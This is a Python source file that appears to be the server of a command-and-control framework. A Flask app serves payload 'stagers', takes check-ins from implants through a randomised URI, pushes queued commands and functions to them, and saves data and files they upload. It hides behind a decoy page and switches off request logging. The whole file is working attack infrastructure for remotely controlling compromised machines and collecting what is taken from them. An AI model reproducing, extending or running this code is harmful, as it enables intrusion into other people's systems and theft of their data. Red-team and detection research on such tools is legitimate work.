import logging
import os
import urllib.parse as parse
import sys

from connect import cli, connection, loader, util
from flask import Flask, make_response, render_template, request, send_file

app = Flask(__name__)

checkin_uri = f'/{util.generate_id()}'
server_cli = cli.CommandLine(prompt='server~#')
status = 'stopped'

def information():
    server_cli.header('Information')
    server_cli.print('default', f' - checkin uri: {checkin_uri}')
    server_cli.print('default', f' - status: {status}')
    server_cli.print('default', '')
    return 0, 'Success'

def interact():
    server_cli.update_options('information', information, 'Displays information about the server.', 'Server Options')
    server_cli.run()
    return 0, 'Success'

'''
Routes
 - /checkin_uri (POST)
 - /format_id (GET)
'''
@app.route(f'{checkin_uri}', methods=['POST'])
def checkin():
    response = make_response(render_template('random.html', random_data=util.random_data))
    try:
        connection = engine.connections[request.headers['Connection-ID']]
    except:
        return response
    connection.system_information['ip'] = request.remote_addr
    connection.check_in()
    if request.get_data():
        data = request.get_data()
        if request.headers['mimetype'] == 'text/plain':
            server_cli.print('default', '\n')
            server_cli.print('information', f'Results recieved from ({request.remote_addr}):')
            server_cli.print('default', str(data,'utf-8'))
        else:
            filename = f'{util.generate_str()}.connect'
            server_cli.print('default', '\n')
            server_cli.print('information', f'{sys.getsizeof(data)} Bytes recieved from ({request.remote_addr}) saving to downloads/{filename}.')
            loader.download(data, f'{filename}')
    if connection.job_queue:
        job = connection.job_queue.pop(0)
        if job.type == 'function':
            return connection.stager.process_function(job.data, server_cli, response, checkin_uri, engine)
        if job.type == 'command':
            return connection.stager.process_command(job.data, server_cli, response, checkin_uri, engine)
    return response

@app.route('/<format_id>', methods=['GET'])
def serve_stagers(format_id):
    if '.' in format_id:
        format_id = format_id.split('.')[0]
    remote_addr = request.remote_addr
    if format_id not in engine.STAGERS.keys():
        return render_template('random.html', random_data=util.random_data)
    stager = engine.STAGERS[format_id]
    server_cli.print('information', f'{stager.format} file requested ({remote_addr})')
    connection = engine.create_connection(stager)
    connection.system_information['ip'] = remote_addr
    return connection.stager.render(connection.connection_id, checkin_uri)

def run(ip, port):
    os.environ['WERKZEUG_RUN_MAIN'] = 'true'
    log = logging.getLogger('werkzeug')
    log.disabled = True
    app.config['TEMPLATES_AUTO_RELOAD'] = True
    ssl_context = None
    if util.ssl:
        ssl_context = (util.ssl[0], util.ssl[1])
    try:
        status = 'running'
        app.run(host=ip, port=port, ssl_context=ssl_context)
    except:
        status = 'stopped'
        server_cli.print('information', f'Error starting server.')
        return
    return
